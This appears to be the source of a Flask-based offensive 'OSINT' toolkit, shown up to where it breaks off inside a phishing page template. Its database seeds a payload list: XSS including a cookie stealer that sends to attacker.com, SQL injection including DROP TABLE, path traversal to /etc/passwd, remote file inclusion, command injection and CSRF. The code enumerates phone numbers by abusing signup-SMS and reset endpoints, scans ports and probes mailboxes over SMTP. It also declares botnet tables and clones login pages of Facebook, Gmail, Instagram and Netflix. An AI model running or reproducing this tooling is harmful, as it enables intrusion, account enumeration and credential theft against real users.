#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🔥 SHADOW OSINT v7.0 - ARMAGEDDON 🔥                     ║
║        منصة الاستخبارات والفحص الأمني المتكاملة - كل الأدوات في مكان واحد      ║
║                  المستخدم يتحمل المسؤولية القانونية كاملة                      ║
╚══════════════════════════════════════════════════════════════════════════════╝

تحذير: هذا الكود للأغراض التعليمية والبحثية الأمنية فقط.
استخدامه في اختراق الأنظمة أو سرقة البيانات أو انتحال الهوية جريمة يعاقب عليها القانون.
"""

import os, re, sys, json, time, socket, ssl, base64, hashlib, secrets, sqlite3
import random, string, subprocess, threading, queue, traceback, fnmatch
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template_string, request, jsonify, send_file, session as flask_session

# ==================== Flask App ====================
web_app = Flask(__name__)
web_app.secret_key = secrets.token_hex(32)
PORT = int(os.environ.get("PORT", 8080))
executor = ThreadPoolExecutor(max_workers=20)

# ==================== Database ====================
DB_PATH = "shadow_ultimate.db"

def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT, scan_type TEXT, result TEXT,
                ip TEXT, user_agent TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT, vuln_type TEXT, severity TEXT,
                description TEXT, payload TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                category TEXT, name TEXT, payload TEXT,
                description TEXT, risk_level TEXT
            );
            CREATE TABLE IF NOT EXISTS breach_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT, domain TEXT, breach_name TEXT,
                data_type TEXT, date_found TEXT
            );
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT, target TEXT, html_content TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS botnet_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT, port INTEGER, status TEXT,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.commit()
        # Seed payloads
        conn.executemany("INSERT OR IGNORE INTO payloads (category, name, payload, description, risk_level) VALUES (?,?,?,?,?)", [
            ("XSS", "Basic Alert", '<script>alert("XSS")</script>', "Basic XSS test payload", "Medium"),
            ("XSS", "Cookie Stealer", '<script>fetch("https://attacker.com/?c="+document.cookie)</script>', "Steals cookies via XSS", "High"),
            ("XSS", "DOM XSS", '#"><img src=x onerror=alert(1)>', "DOM-based XSS payload", "Medium"),
            ("XSS", "Bypass Filter", '<ScRiPt>alert(1)</ScRiPt>', "Case bypass filter", "Medium"),
            ("XSS", "Event Handler", '<body onload=alert("XSS")>', "Event handler XSS", "Medium"),
            ("SQLi", "Basic Union", "' UNION SELECT 1,2,3-- -", "Basic SQLi union select", "High"),
            ("SQLi", "Error Based", "' AND 1=CONVERT(int,(SELECT @@version))--", "Error-based SQLi", "High"),
            ("SQLi", "Time Blind", "'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--", "Time-based blind SQLi", "High"),
            ("SQLi", "Boolean Blind", "' AND 1=1--", "Boolean-based blind test", "Medium"),
            ("SQLi", "Drop Table", "'; DROP TABLE users--", "Destructive SQLi", "Critical"),
            ("LFI", "Basic Path Traversal", "../../../etc/passwd", "Basic LFI payload", "High"),
            ("LFI", "Null Byte", "../../../etc/passwd%00", "Null byte bypass", "High"),
            ("LFI", "PHP Filter", "php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper", "High"),
            ("RFI", "Remote Include", "http://attacker.com/shell.txt", "Remote file inclusion", "Critical"),
            ("Command Injection", "Basic", "; ls -la", "Basic command injection", "Critical"),
            ("Command Injection", "Pipe", "| whoami", "Pipe command injection", "Critical"),
            ("Command Injection", "Backtick", "`id`", "Backtick injection", "Critical"),
            ("CSRF", "Basic Form", '<form action="https://victim.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="1000"></form><script>document.forms[0].submit()</script>', "CSRF attack payload", "High"),
            ("SSRF", "AWS Metadata", "http://169.254.169.254/latest/meta-data/", "AWS metadata SSRF", "Critical"),
            ("SSRF", "Internal Port Scan", "http://localhost:8080", "Internal SSRF", "Medium"),
        ])
        conn.commit()

def db_query(query, params=(), fetch=False):
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        cur = conn.execute(query, params)
        conn.commit()
        return [dict(r) for r in cur.fetchall()] if fetch else cur

def db_insert(table, data):
    keys = ", ".join(data.keys())
    placeholders = ", ".join(["?"] * len(data))
    query = f"INSERT INTO {table} ({keys}) VALUES ({placeholders})"
    return db_query(query, list(data.values()))

# ==================== HTTP Client ====================
class HTTPClient:
    def __init__(self):
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
    
    def get(self, url, **kwargs):
        try:
            import httpx
            headers = {"User-Agent": random.choice(self.ua_list)}
            headers.update(kwargs.pop('headers', {}))
            timeout = kwargs.pop('timeout', 15)
            return httpx.get(url, headers=headers, timeout=timeout, follow_redirects=True, **kwargs)
        except:
            return None
    
    def post(self, url, **kwargs):
        try:
            import httpx
            headers = {"User-Agent": random.choice(self.ua_list)}
            headers.update(kwargs.pop('headers', {}))
            timeout = kwargs.pop('timeout', 15)
            return httpx.post(url, headers=headers, timeout=timeout, **kwargs)
        except:
            return None

http = HTTPClient()

# ==================== استخبارات الهاتف ====================
class PhoneIntel:
    def scan(self, phone):
        results = {"phone": phone, "timestamp": datetime.now().isoformat(), "platforms": {}}
        
        clean = phone.replace("+", "").replace(" ", "").replace("-", "")
        
        with ThreadPoolExecutor(max_workers=15) as pool:
            futures = {
                "whatsapp": pool.submit(self._whatsapp, phone, clean),
                "telegram": pool.submit(self._telegram, phone),
                "viber": pool.submit(self._viber, phone),
                "signal": pool.submit(self._signal, phone),
                "facebook": pool.submit(self._facebook, phone),
                "instagram": pool.submit(self._instagram, phone),
                "snapchat": pool.submit(self._snapchat, phone),
                "twitter": pool.submit(self._twitter, phone),
                "linkedin": pool.submit(self._linkedin, phone),
                "truecaller": pool.submit(self._truecaller, clean),
                "carrier": pool.submit(self._carrier, phone),
                "breaches": pool.submit(self._breaches, phone),
                "numverify": pool.submit(self._numverify, phone),
                "google": pool.submit(self._google, phone),
                "paypal": pool.submit(self._paypal, phone),
                "amazon": pool.submit(self._amazon, phone),
                "tiktok": pool.submit(self._tiktok, phone),
                "discord": pool.submit(self._discord, phone),
                "skype": pool.submit(self._skype, phone),
                "line": pool.submit(self._line, phone),
            }
            
            for name, future in futures.items():
                try:
                    results["platforms"][name] = future.result(timeout=15)
                except:
                    results["platforms"][name] = None
        
        return results
    
    def _whatsapp(self, phone, clean):
        try:
            r = http.get(f"https://wa.me/{clean}")
            return {"exists": r and "Continue to Chat" in r.text}
        except:
            return None
    
    def _telegram(self, phone):
        try:
            r = http.post("https://my.telegram.org/auth/send_password", data={"phone": phone})
            return {"exists": r and ("code" in r.text.lower() or "password" in r.text.lower())}
        except:
            return None
    
    def _viber(self, phone):
        try:
            r = http.post("https://api.viber.com/api/v2/check", json={"phone": phone})
            return {"exists": r and r.json().get("exists", False)} if r else None
        except:
            return None
    
    def _signal(self, phone):
        try:
            r = http.get(f"https://api.signal.org/v1/accounts/{phone}", headers={"User-Agent": "Signal-Android/6.0"})
            return {"exists": r and r.status_code == 200}
        except:
            return None
    
    def _facebook(self, phone):
        try:
            r = http.get("https://www.facebook.com/login/identify", params={"ctx": "recover"})
            return {"linked": r and r.status_code == 200}
        except:
            return None
    
    def _instagram(self, phone):
        try:
            r = http.post("https://www.instagram.com/api/v1/accounts/send_signup_sms/", data={"phone_number": phone, "device_id": hashlib.md5(phone.encode()).hexdigest()})
            return {"linked": r and r.status_code == 200}
        except:
            return None
    
    def _snapchat(self, phone):
        try:
            r = http.post("https://accounts.snapchat.com/accounts/phone_verify", json={"phone": phone})
            return {"linked": r and r.status_code == 200}
        except:
            return None
    
    def _twitter(self, phone):
        try:
            r = http.post("https://api.twitter.com/1.1/account/send_verification", data={"phone_number": phone})
            return {"linked": r and r.status_code == 200}
        except:
            return None
    
    def _linkedin(self, phone):
        try:
            r = http.get("https://www.linkedin.com/uas/request-password-reset")
            return {"checked": r is not None}
        except:
            return None
    
    def _truecaller(self, clean):
        try:
            r = http.get(f"https://www.truecaller.com/search/eg/{clean}", headers={"Accept-Language": "ar,en;q=0.9"})
            if r:
                import bs4
                soup = bs4.BeautifulSoup(r.text, 'html.parser')
                for script in soup.find_all("script", type="application/ld+json"):
                    if script.string and "name" in script.string:
                        data = json.loads(script.string)
                        if data.get("name"):
                            return {"name": data["name"], "spam_score": data.get("spamScore", 0)}
            return {"found": False}
        except:
            return None
    
    def _carrier(self, phone):
        try:
            import phonenumbers
            from phonenumbers import carrier, geocoder, timezone
            p = phonenumbers.parse(phone)
            return {
                "valid": phonenumbers.is_valid_number(p),
                "country": geocoder.description_for_number(p, "en"),
                "carrier": carrier.name_for_number(p, "en"),
                "timezone": list(timezone.time_zones_for_number(p)),
                "type": str(phonenumbers.number_type(p)),
                "national": phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.NATIONAL),
                "international": phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            }
        except:
            return None
    
    def _breaches(self, phone):
        try:
            r = http.get(f"https://haveibeenpwned.com/api/v3/pasteaccount/{phone}")
            if r and r.status_code == 200:
                return {"count": len(r.json())}
            return {"count": 0}
        except:
            return None
    
    def _numverify(self, phone):
        key = os.environ.get("NUMVERIFY_KEY", "")
        if not key:
            return None
        try:
            r = http.get("http://apilayer.net/api/validate", params={"access_key": key, "number": phone, "format": 1})
            if r:
                d = r.json()
                return {"valid": d.get("valid"), "country": d.get("country_name"), "carrier": d.get("carrier"), "line_type": d.get("line_type"), "location": d.get("location")}
        except:
            return None
    
    def _google(self, phone):
        try:
            r = http.get("https://accounts.google.com/signin/v2/recoveryidentifier", params={"flowName": "GlifWebSignIn"})
            return {"checked": r is not None}
        except:
            return None
    
    def _paypal(self, phone):
        try:
            r = http.get("https://www.paypal.com/authflow/password-recovery/")
            return {"checked": r is not None}
        except:
            return None
    
    def _amazon(self, phone):
        try:
            r = http.get("https://www.amazon.com/ap/forgotpassword")
            return {"checked": r is not None}
        except:
            return None
    
    def _tiktok(self, phone):
        try:
            r = http.post("https://www.tiktok.com/passport/email/verify/", data={"phone": phone})
            return {"linked": r and r.status_code == 200}
        except:
            return None
    
    def _discord(self, phone):
        try:
            r = http.get("https://discord.com/api/v9/auth/forgot")
            return {"checked": r is not None}
        except:
            return None
    
    def _skype(self, phone):
        try:
            r = http.get("https://login.live.com/password/reset")
            return {"checked": r is not None}
        except:
            return None
    
    def _line(self, phone):
        try:
            r = http.post("https://api.line.me/v2/oauth/verify", data={"phone": phone})
            return {"linked": r and r.status_code == 200}
        except:
            return None

phone_intel = PhoneIntel()

# ==================== فحص IP متقدم ====================
class IPIntel:
    def scan(self, ip):
        results = {"ip": ip, "timestamp": datetime.now().isoformat()}
        
        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = {
                "ipinfo": pool.submit(self._ipinfo, ip),
                "geoip": pool.submit(self._geoip, ip),
                "shodan": pool.submit(self._shodan, ip),
                "abuseipdb": pool.submit(self._abuseipdb, ip),
                "ports": pool.submit(self._port_scan, ip),
                "dns": pool.submit(self._reverse_dns, ip),
                "vpn_proxy": pool.submit(self._check_vpn, ip),
                "tor": pool.submit(self._check_tor, ip),
                "blacklists": pool.submit(self._check_blacklists, ip),
                "whois": pool.submit(self._whois, ip),
                "ping": pool.submit(self._ping, ip),
                "traceroute": pool.submit(self._traceroute, ip),
            }
            
            for name, future in futures.items():
                try:
                    result = future.result(timeout=10)
                    if result is not None:
                        results[name] = result
                except:
                    pass
        
        return results
    
    def _ipinfo(self, ip):
        try:
            token = os.environ.get("IPINFO_TOKEN", "")
            url = f"https://ipinfo.io/{ip}/json" + (f"?token={token}" if token else "")
            r = http.get(url)
            return r.json() if r and r.status_code == 200 else None
        except:
            return None
    
    def _geoip(self, ip):
        try:
            r = http.get(f"http://ip-api.com/json/{ip}?fields=66846719")
            return r.json() if r and r.status_code == 200 else None
        except:
            return None
    
    def _shodan(self, ip):
        key = os.environ.get("SHODAN_KEY", "")
        if not key:
            return None
        try:
            r = http.get(f"https://api.shodan.io/shodan/host/{ip}", params={"key": key})
            if r and r.status_code == 200:
                d = r.json()
                return {"ports": d.get("ports", []), "org": d.get("org", ""), "os": d.get("os", ""), "vulns": list(d.get("vulns", {}).keys())[:10], "domains": d.get("domains", []), "hostnames": d.get("hostnames", [])}
        except:
            return None
    
    def _abuseipdb(self, ip):
        key = os.environ.get("ABUSEIPDB_KEY", "")
        if not key:
            return None
        try:
            r = http.get("https://api.abuseipdb.com/api/v2/check", params={"ipAddress": ip, "maxAgeInDays": 90, "verbose": ""}, headers={"Key": key, "Accept": "application/json"})
            if r and r.status_code == 200:
                d = r.json().get("data", {})
                return {"score": d.get("abuseConfidenceScore", 0), "reports": d.get("totalReports", 0), "isp": d.get("isp", ""), "usage": d.get("usageType", ""), "country": d.get("countryCode", "")}
        except:
            return None
    
    def _port_scan(self, ip):
        ports = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3",
            111: "RPC", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
            8443: "HTTPS-Alt", 9200: "Elasticsearch", 11211: "Memcached", 27017: "MongoDB"
        }
        open_ports = []
        with ThreadPoolExecutor(max_workers=50) as pool:
            future_to_port = {pool.submit(self._check_port, ip, port): port for port in ports}
            for future in as_completed(future_to_port):
                port = future_to_port[future]
                try:
                    if future.result(timeout=0.5):
                        open_ports.append({"port": port, "service": ports[port]})
                except:
                    pass
        return {"open": sorted(open_ports, key=lambda x: x["port"]), "scanned": len(ports)}
    
    def _check_port(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            result = s.connect_ex((ip, port)) == 0
            s.close()
            return result
        except:
            return False
    
    def _reverse_dns(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return None
    
    def _check_vpn(self, ip):
        try:
            r = http.get(f"https://vpnapi.io/api/{ip}?key=")
            if r:
                d = r.json()
                return {"vpn": d.get("security", {}).get("vpn", False), "proxy": d.get("security", {}).get("proxy", False), "tor": d.get("security", {}).get("tor", False)}
        except:
            return None
    
    def _check_tor(self, ip):
        try:
            r = http.get("https://check.torproject.org/torbulkexitlist")
            if r:
                tor_ips = r.text.strip().split("\n")
                return ip in tor_ips
        except:
            return None
    
    def _check_blacklists(self, ip):
        blacklists = ["zen.spamhaus.org", "bl.spamcop.net", "dnsbl.sorbs.net", "b.barracudacentral.org"]
        results = {}
        reversed_ip = ".".join(reversed(ip.split(".")))
        for bl in blacklists:
            try:
                socket.gethostbyname(f"{reversed_ip}.{bl}")
                results[bl] = True
            except:
                results[bl] = False
        return results
    
    def _whois(self, ip):
        try:
            r = http.get(f"https://whois.freeaiapi.xyz/?domain={ip}&format=json")
            return r.json() if r else None
        except:
            return None
    
    def _ping(self, ip):
        try:
            result = subprocess.run(["ping", "-c", "3", "-W", "2", ip], capture_output=True, text=True, timeout=5)
            return {"reachable": result.returncode == 0, "output": result.stdout[:500]}
        except:
            return None
    
    def _traceroute(self, ip):
        try:
            result = subprocess.run(["traceroute", "-m", "10", "-w", "2", ip], capture_output=True, text=True, timeout=15)
            return {"output": result.stdout[:1000]}
        except:
            return None

ip_intel = IPIntel()

# ==================== فحص الثغرات ====================
class VulnerabilityScanner:
    def __init__(self):
        self.payloads = db_query("SELECT * FROM payloads", fetch=True)
    
    def scan_url(self, url):
        results = {"url": url, "timestamp": datetime.now().isoformat(), "vulnerabilities": []}
        
        # SSL Check
        try:
            hostname = urlparse(url).hostname or url
            ctx = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    expiry = datetime.strptime(cert.get("notAfter"), "%b %d %H:%M:%S %Y %Z")
                    results["ssl"] = {
                        "valid_until": cert.get("notAfter"),
                        "issuer": dict(x[0] for x in cert.get("issuer", [])),
                        "days_left": (expiry - datetime.now()).days,
                        "expired": expiry < datetime.now(),
                        "self_signed": cert.get("issuer") == cert.get("subject")
                    }
        except Exception as e:
            results["ssl"] = {"error": str(e)}
        
        # Security Headers
        try:
            r = http.get(url)
            if r:
                headers = r.headers
                sec_headers = {
                    "Strict-Transport-Security": headers.get("Strict-Transport-Security"),
                    "Content-Security-Policy": headers.get("Content-Security-Policy"),
                    "X-Frame-Options": headers.get("X-Frame-Options"),
                    "X-Content-Type-Options": headers.get("X-Content-Type-Options"),
                    "X-XSS-Protection": headers.get("X-XSS-Protection"),
                    "Referrer-Policy": headers.get("Referrer-Policy"),
                    "Permissions-Policy": headers.get("Permissions-Policy")
                }
                missing = [k for k, v in sec_headers.items() if not v]
                results["security_headers"] = {
                    "present": {k: v for k, v in sec_headers.items() if v},
                    "missing": missing,
                    "score": len([v for v in sec_headers.values() if v]) * 100 // len(sec_headers),
                    "server": headers.get("Server", ""),
                    "powered_by": headers.get("X-Powered-By", "")
                }
                
                # Check for common vulnerabilities
                if not headers.get("X-Frame-Options"):
                    results["vulnerabilities"].append({"type": "Clickjacking", "severity": "Medium", "description": "No X-Frame-Options header - site vulnerable to clickjacking"})
                if not headers.get("X-Content-Type-Options"):
                    results["vulnerabilities"].append({"type": "MIME Sniffing", "severity": "Low", "description": "No X-Content-Type-Options header"})
                if headers.get("Server"):
                    results["vulnerabilities"].append({"type": "Information Disclosure", "severity": "Low", "description": f"Server header reveals: {headers.get('Server')}"})
        except:
            pass
        
        # VirusTotal
        key = os.environ.get("VIRUSTOTAL_KEY", "")
        if key:
            try:
                url_id = base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")
                r = http.get(f"https://www.virustotal.com/api/v3/urls/{url_id}", headers={"x-apikey": key})
                if r and r.status_code == 200:
                    stats = r.json().get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                    results["virustotal"] = stats
                    if stats.get("malicious", 0) > 0:
                        results["vulnerabilities"].append({"type": "Malicious URL", "severity": "Critical", "description": f"Detected by {stats['malicious']} security vendors"})
            except:
                pass
        
        # Technology Detection
        try:
            r = http.get(url)
            if r:
                import bs4
                soup = bs4.BeautifulSoup(r.text, 'html.parser')
                tech = []
                
                # CMS
                gen = soup.find("meta", {"name": "generator"})
                if gen:
                    tech.append({"type": "CMS", "name": gen.get("content", "")})
                
                # JavaScript
                scripts = [s.get("src", "") for s in soup.find_all("script", src=True)]
                js_map = {"jquery": "jQuery", "react": "React", "vue": "Vue.js", "angular": "Angular", "bootstrap": "Bootstrap", "lodash": "Lodash", "moment": "Moment.js", "d3": "D3.js"}
                for script in scripts:
                    for key, name in js_map.items():
                        if key in script.lower():
                            tech.append({"type": "JavaScript", "name": name})
                
                # WordPress specific
                if soup.find("meta", {"name": "generator", "content": re.compile(r"WordPress")}):
                    tech.append({"type": "CMS", "name": "WordPress"})
                    # Check WP version
                    ver = soup.find("meta", {"name": "generator"})
                    if ver:
                        wp_version = ver.get("content", "").replace("WordPress ", "")
                        tech.append({"type": "Version", "name": f"WP {wp_version}"})
                
                results["technology"] = list({t["name"]: t for t in tech}.values())
                
                # Check for exposed files
                sensitive_paths = ["/wp-config.php.bak", "/.env", "/.git/config", "/backup.zip", "/admin/", "/phpinfo.php", "/server-status", "/.DS_Store"]
                for path in sensitive_paths:
                    try:
                        check_url = urljoin(url, path)
                        r2 = http.get(check_url)
                        if r2 and r2.status_code == 200 and len(r2.text) > 0:
                            results["vulnerabilities"].append({"type": "Exposed File", "severity": "High", "description": f"Found exposed: {path}", "url": check_url})
                    except:
                        pass
        except:
            pass
        
        # Content Analysis
        try:
            r = http.get(url)
            if r:
                import bs4
                soup = bs4.BeautifulSoup(r.text, 'html.parser')
                results["content"] = {
                    "title": soup.title.string if soup.title else "",
                    "forms": len(soup.find_all("form")),
                    "inputs": len(soup.find_all("input")),
                    "links": len(soup.find_all("a")),
                    "images": len(soup.find_all("img")),
                    "scripts": len(soup.find_all("script")),
                    "iframes": len(soup.find_all("iframe")),
                    "has_file_upload": bool(soup.find("input", {"type": "file"})),
                    "has_login": bool(soup.find("input", {"type": "password"})),
                    "comments": len(soup.find_all(string=lambda text: isinstance(text, bs4.Comment)))
                }
                
                # Check for XSS in forms
                if results["content"]["forms"] > 0:
                    results["vulnerabilities"].append({"type": "Potential XSS", "severity": "Medium", "description": f"Found {results['content']['forms']} form(s) - should be tested for XSS"})
        except:
            pass
        
        # SQL Injection test
        try:
            test_url = f"{url}{'&' if '?' in url else '?'}id=1'"
            r = http.get(test_url)
            if r:
                sql_errors = ["sql syntax", "mysql_fetch", "unclosed quotation mark", "ora-", "sqlite3", "postgresql", "odbc", "syntax error", "mysql", "database error"]
                for error in sql_errors:
                    if error.lower() in r.text.lower():
                        results["vulnerabilities"].append({"type": "SQL Injection", "severity": "Critical", "description": f"Potential SQLi detected: {error}", "test_url": test_url})
                        break
        except:
            pass
        
        return results

vuln_scanner = VulnerabilityScanner()

# ==================== فحص البريد ====================
class EmailIntel:
    def scan(self, email):
        results = {"email": email, "timestamp": datetime.now().isoformat()}
        domain = email.split("@")[-1] if "@" in email else ""
        
        # Validation
        results["valid_format"] = bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email))
        
        # Disposable
        disposable_domains = ['tempmail.com','10minutemail.com','guerrillamail.com','mailinator.com','yopmail.com','throwaway.email','sharklasers.com','trashmail.com','temp-mail.org','fakeinbox.com','emailondeck.com','spamgourmet.com','maildrop.cc','getnada.com','dispostable.com','mailnesia.com','tempr.email','grr.la','pokemail.net','spam4.me','bccto.me','chacuo.net','nwytg.com','linshiyouxiang.net','123.com','tmail.com','tmail.org','tmail.net']
        results["disposable"] = domain.lower() in disposable_domains
        
        # MX Check
        try:
            import dns.resolver
            answers = dns.resolver.resolve(domain, 'MX')
            results["mx_valid"] = bool(answers)
            results["mx_records"] = [str(a.exchange) for a in answers]
        except:
            results["mx_valid"] = False
            results["mx_records"] = []
        
        # SMTP Check
        try:
            if results["mx_records"]:
                mx = results["mx_records"][0]
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((mx, 25))
                banner = s.recv(1024).decode()
                s.send(b"HELO test.com\r\n")
                s.recv(1024)
                s.send(f"MAIL FROM:<test@test.com>\r\n".encode())
                s.recv(1024)
                s.send(f"RCPT TO:<{email}>\r\n".encode())
                response = s.recv(1024).decode()
                s.send(b"QUIT\r\n")
                s.close()
                results["smtp_check"] = "250" in response
            else:
                results["smtp_check"] = False
        except:
            results["smtp_check"] = None
        
        # Breaches
        try:
            r = http.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
            if r:
                if r.status_code == 200:
                    results["breaches"] = [{"name": b["Name"], "domain": b.get("Domain", ""), "date": b.get("BreachDate", ""), "description": b.get("Description", "")[:200]} for b in r.json()]
                elif r.status_code == 404:
                    results["breaches"] = []
        except:
            results["breaches"] = None
        
        # Gravatar
        try:
            email_hash = hashlib.md5(email.lower().strip().encode()).hexdigest()
            r = http.get(f"https://www.gravatar.com/{email_hash}.json")
            if r and r.status_code == 200:
                results["gravatar"] = r.json()
        except:
            pass
        
        # Social Media
        platforms = {
            "facebook": f"https://www.facebook.com/search/people/?q={email}",
            "linkedin": f"https://www.linkedin.com/search/results/people/?keywords={email}",
            "twitter": f"https://twitter.com/search?q={email}",
            "github": f"https://api.github.com/search/users?q={email}+in:email",
        }
        results["social_search"] = platforms
        
        return results

email_intel = EmailIntel()

# ==================== فحص اسم المستخدم ====================
class UsernameIntel:
    def scan(self, username):
        results = {"username": username, "timestamp": datetime.now().isoformat(), "platforms": {}}
        
        platforms = {
            "GitHub": (f"https://github.com/{username}", "Not Found"),
            "Twitter": (f"https://twitter.com/{username}", "This account doesn"),
            "Instagram": (f"https://www.instagram.com/{username}/", "Page Not Found"),
            "Reddit": (f"https://www.reddit.com/user/{username}", "page not found"),
            "TikTok": (f"https://www.tiktok.com/@{username}", "Couldn't find this account"),
            "Snapchat": (f"https://www.snapchat.com/add/{username}", "not found"),
            "YouTube": (f"https://www.youtube.com/@{username}", "This channel doesn't exist"),
            "Twitch": (f"https://www.twitch.tv/{username}", "Sorry. Unless you"),
            "Pinterest": (f"https://www.pinterest.com/{username}/", "not found"),
            "Spotify": (f"https://open.spotify.com/user/{username}", "Page not found"),
            "Steam": (f"https://steamcommunity.com/id/{username}", "The specified profile could not be found"),
            "Roblox": (f"https://www.roblox.com/user.aspx?username={username}", "Page cannot be found"),
            "DeviantArt": (f"https://www.deviantart.com/{username}", "not found"),
            "Patreon": (f"https://www.patreon.com/{username}", "not found"),
            "Medium": (f"https://medium.com/@{username}", "Not Found"),
            "Quora": (f"https://www.quora.com/profile/{username}", "not found"),
            "VK": (f"https://vk.com/{username}", "not found"),
            "Flickr": (f"https://www.flickr.com/people/{username}", "not found"),
            "Behance": (f"https://www.behance.net/{username}", "not found"),
            "Dribbble": (f"https://dribbble.com/{username}", "Whoops, that page is gone"),
            "Keybase": (f"https://keybase.io/{username}", "not found"),
            "Pastebin": (f"https://pastebin.com/u/{username}", "Not Found"),
            "SoundCloud": (f"https://soundcloud.com/{username}", "not found"),
            "HackerNews": (f"https://news.ycombinator.com/user?id={username}", "No such user"),
            "Bitbucket": (f"https://bitbucket.org/{username}/", "not found"),
            "GitLab": (f"https://gitlab.com/{username}", "not found"),
            "CodePen": (f"https://codepen.io/{username}", "not found"),
            "Replit": (f"https://replit.com/@{username}", "not found"),
            "Telegram": (f"https://t.me/{username}", "not found"),
            "WhatsApp": (f"https://wa.me/{username}", "not valid"),
            "OnlyFans": (f"https://onlyfans.com/{username}", "not found"),
            "Blogger": (f"https://{username}.blogspot.com", "not found"),
            "WordPress": (f"https://{username}.wordpress.com", "not found"),
            "Tumblr": (f"https://{username}.tumblr.com", "not found"),
            "About.me": (f"https://about.me/{username}", "not found"),
            "Linktree": (f"https://linktr.ee/{username}", "not found"),
        }
        
        with ThreadPoolExecutor(max_workers=20) as pool:
            futures = {}
            for name, (url, not_found) in platforms.items():
                futures[name] = pool.submit(self._check_platform, url, not_found)
            
            for name, future in futures.items():
                try:
                    results["platforms"][name] = future.result(timeout=8)
                except:
                    results["platforms"][name] = None
        
        results["found_count"] = sum(1 for v in results["platforms"].values() if v is True)
        results["total_checked"] = len(platforms)
        
        return results
    
    def _check_platform(self, url, not_found_text):
        try:
            r = http.get(url)
            if r and r.status_code == 200:
                if not_found_text.lower() not in r.text.lower()[:500]:
                    return True
            return False
        except:
            return None

username_intel = UsernameIntel()

# ==================== واجهة التصيد (للتدريب الأمني) ====================
class PhishingSimulator:
    """محاكي تصيد للأغراض التعليمية فقط"""
    
    TEMPLATES = {
        "facebook": {
            "title": "Facebook - Log In or Sign Up",
            "fields": ["email", "password"],
            "action": "https://www.facebook.com/login.php"
        },
        "instagram": {
            "title": "Instagram - Login",
            "fields": ["username", "password"],
            "action": "https://www.instagram.com/accounts/login/"
        },
        "gmail": {
            "title": "Gmail - Sign in",
            "fields": ["email", "password"],
            "action": "https://accounts.google.com/signin"
        },
        "netflix": {
            "title": "Netflix - Sign In",
            "fields": ["email", "password"],
            "action": "https://www.netflix.com/login"
        }
    }
    
    def generate_page(self, service):
        """Generate educational phishing simulation page"""
        template = self.TEMPLATES.get(service, self.TEMPLATES["facebook"])
        return f"""
        <!DOCTYPE html><html><head><title>{template['title']}</title>
        <style>
            body{{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
            .container{{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:400px}}
            h1{{color:#1877f2;text-align:center}}
            input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box}}
            button{{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer}}
